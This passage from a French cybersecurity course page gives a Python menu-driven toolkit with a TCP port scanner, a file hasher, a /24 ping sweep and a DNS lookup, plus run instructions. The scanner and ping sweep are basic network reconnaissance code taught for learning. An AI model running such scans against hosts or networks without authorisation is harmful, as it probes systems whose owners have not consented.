
def scanner_ports(ip):
    """Scanne les ports TCP courants sur une adresse IP.

    Args:
        ip: Adresse IP cible (ex : "192.168.1.1")
    """
    ports_communs = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        8080: "HTTP-Alt",
        8443: "HTTPS-Alt",
    }

    print(f"\nScan de {ip}...")
    print("-" * 45)

    ouverts = 0
    for port, service in ports_communs.items():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                print(f"  [OUVERT] Port {port:>5} - {service}")
                ouverts += 1
        except socket.error as e:
            print(f"  [ERREUR] Port {port:>5} - {e}")

    print("-" * 45)
    print(f"Résultat : {ouverts} port(s) ouvert(s) sur {len(ports_communs)} testés")


def calculer_hash(chemin):
    """Calcule les hash MD5 et SHA256 d'un fichier.

    Args:
        chemin: Chemin vers le fichier à hasher
    """
    if not os.path.isfile(chemin):
        print(f"[ERREUR] Le fichier '{chemin}' n'existe pas.")
        return

    md5 = hashlib.md5()
    sha256 = hashlib.sha256()

    taille = os.path.getsize(chemin)

    with open(chemin, "rb") as f:
        while True:
            bloc = f.read(8192)
            if not bloc:
                break
            md5.update(bloc)
            sha256.update(bloc)

    print(f"\nFichier : {chemin}")
    print(f"Taille  : {taille} octets")
    print(f"MD5     : {md5.hexdigest()}")
    print(f"SHA256  : {sha256.hexdigest()}")


def ping_sweep(reseau):
    """Découvre les hôtes actifs sur un sous-réseau /24.

    Args:
        reseau: Les 3 premiers octets du réseau (ex : "192.168.1")
    """
    print(f"\nPing sweep sur {reseau}.0/24...")
    print("-" * 35)

    actifs = []
    for i in range(1, 255):
        ip = f"{reseau}.{i}"
        # Ping avec 1 paquet et timeout de 1 seconde
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if result.returncode == 0:
            print(f"  [ACTIF] {ip}")
            actifs.append(ip)

    print("-" * 35)
    print(f"Résultat : {len(actifs)} hôte(s) actif(s)")
    return actifs


def recherche_dns(domaine):
    """Résout un nom de domaine en adresse(s) IP.

    Args:
        domaine: Nom de domaine à résoudre (ex : "example.com")
    """
    try:
        # getaddrinfo retourne toutes les adresses associées
        resultats = socket.getaddrinfo(domaine, None)
        # Extrait les adresses IP uniques
        adresses = set()
        for resultat in resultats:
            adresses.add(resultat[4][0])

        print(f"\nRésolution DNS de {domaine} :")
        for adresse in sorted(adresses):
            # Détermine si c'est IPv4 ou IPv6
            version = "IPv4" if "." in adresse else "IPv6"
            print(f"  {version} : {adresse}")

    except socket.gaierror:
        print(f"[ERREUR] Impossible de résoudre '{domaine}'")


def afficher_menu():
    """Affiche le menu principal."""
    print("\n" + "=" * 45)
    print("    BOÎTE À OUTILS CYBERSÉCURITÉ")
    print("=" * 45)
    print("  1. Scanner de ports TCP")
    print("  2. Calculateur de hash (MD5/SHA256)")
    print("  3. Ping sweep (découverte d'hôtes)")
    print("  4. Recherche DNS")
    print("  0. Quitter")
    print("=" * 45)


def main():
    """Boucle principale du programme."""
    while True:
        afficher_menu()
        choix = input("\nChoix : ").strip()

        if choix == "1":
            ip = input("Adresse IP cible : ").strip()
            scanner_ports(ip)

        elif choix == "2":
            chemin = input("Chemin du fichier : ").strip()
            calculer_hash(chemin)

        elif choix == "3":
            reseau = input("Réseau (ex : 192.168.1) : ").strip()
            ping_sweep(reseau)

        elif choix == "4":
            domaine = input("Nom de domaine : ").strip()
            recherche_dns(domaine)

        elif choix == "0":
            print("Au revoir.")
            sys.exit(0)

        else:
            print("[ERREUR] Choix invalide. Entre 0, 1, 2, 3 ou 4.")


if __name__ == "__main__":
    main()
```

Pour exécuter :

```bash
# Rendre le script exécutable
chmod +x toolkit.py

# Lancer la boîte à outils
python3 toolkit.py
```

---

## Navigation

← Fiche précédente : **[03 - Réseaux - Modèles, Protocoles et Infrastructure](03-reseaux-protocoles.md)**
